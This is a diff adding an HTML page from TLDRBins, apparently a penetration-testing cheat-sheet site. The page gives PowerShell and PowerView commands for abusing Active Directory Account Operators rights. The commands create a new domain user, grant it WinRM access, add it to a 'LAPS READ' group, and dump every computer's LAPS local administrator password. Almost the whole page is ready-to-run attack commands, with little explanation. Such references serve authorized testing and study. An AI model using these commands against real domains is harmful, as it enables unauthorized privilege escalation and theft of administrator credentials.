@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Account Operators | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/account_operators/">
+      <span>Account Operators</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@account-operators/">Account Operators</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-driectory/">Active Driectory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@laps/">LAPS</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="import-powerviewps1">Import PowerView.ps1</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
+</span></span></code></pre></div><h3 id="create-new-user-account">Create New User Account</h3>
+<h4 id="authenticated">Authenticated</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="s2">&#34;password&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secstr</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">SecureString</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span><span class="p">.</span><span class="py">ToCharArray</span><span class="p">()</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span><span class="nv">$secstr</span><span class="p">.</span><span class="py">AppendChar</span><span class="p">(</span><span class="nv">$_</span><span class="p">)}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Create new user</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-AdUser</span> <span class="n">new_user</span> <span class="n">-enabled</span> <span class="vm">$true</span> <span class="n">-accountpassword</span> <span class="nv">$secstr</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Grant new user privilege (e.g. WinRM)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="n">WinRM</span> <span class="n">-Members</span> <span class="s1">&#39;new_user&#39;</span>
+</span></span></code></pre></div><h4 id="runas">Runas</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;domain\username&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="s2">&#34;password&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secstr</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">SecureString</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span><span class="p">.</span><span class="py">ToCharArray</span><span class="p">()</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span><span class="nv">$secstr</span><span class="p">.</span><span class="py">AppendChar</span><span class="p">(</span><span class="nv">$_</span><span class="p">)}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-argumentlist</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secstr</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Create new user</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-AdUser</span> <span class="n">new_user</span> <span class="n">-credential</span> <span class="nv">$cred</span> <span class="n">-enabled</span> <span class="vm">$true</span> <span class="n">-accountpassword</span> <span class="nv">$secstr</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Grant new user privilege (e.g. WinRM)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="n">WinRM</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Members</span> <span class="s1">&#39;new_user&#39;</span>
+</span></span></code></pre></div><h3 id="add-new-user-to-laps-group">Add New User to LAPS group</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;LAPS READ&#39;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Members</span> <span class="s1">&#39;new_user&#39;</span>
+</span></span></code></pre></div><h3 id="read-the-laps-password">Read the LAPS password</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AdComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="nb">ms-Mcs</span><span class="n">-AdmPwd</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
